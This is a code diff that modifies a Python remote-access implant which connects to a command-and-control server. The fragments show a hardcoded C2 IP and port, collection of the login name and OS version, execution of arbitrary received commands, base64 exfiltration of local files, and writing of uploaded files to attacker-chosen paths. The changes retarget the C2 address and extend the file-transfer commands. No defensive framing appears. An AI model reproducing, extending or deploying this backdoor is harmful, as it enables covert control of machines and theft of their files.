@@ -11,11 +11,11 @@ import time
 import subprocess
 
 SECRET_KEY = b'0123456789abcdef0123456789abcdef'
-C2_SERVER_IP = "192.168.1.20"
+C2_SERVER_IP = "127.0.0.1"
 C2_SERVER_PORT = 9090
 
 def get_system_info():
-    username = platform.node()
+    username = os.getlogin()
     os_version = platform.system() + " " + platform.release()
     return f"{username}|{os_version}"
 
@@ -52,15 +52,15 @@ def download_file(file):
         with open(file, "rb") as f:
             content = f.read()
             encoded = base64.b64encode(content).decode("utf-8")
-            response = f"[download]" + encoded
+            response = f"[download]" + f" {encoded} " + file
     else:
         response = f"[!] El archivo {file} no existe."
     return response
 
-def upload_file(content):
-    with open("uploaded_file", "wb") as f:
+def upload_file(content, file_name):
+    with open(file_name, "wb") as f:
         f.write(base64.b64decode(content))
-    if os.path.exists("uploaded_file"):
+    if os.path.exists(file_name):
         response = "[File uploaded]"
     else:
         response = "[Error uploading file]"
@@ -104,9 +104,11 @@ def connect_to_c2():
                     file = command.split(" ")[1]
                     output = download_file(file)
 
-                elif command.startswith("[upload]"):
-                    content = command.split("[upload]")[1]
-                    output = upload_file(content)
+                elif command.startswith("upload"):
+                    args = command.split()
+                    content = args[1]
+                    file_name = args[2]
+                    output = upload_file(content, file_name)
 
                 else:
                     output = execute_command(command)
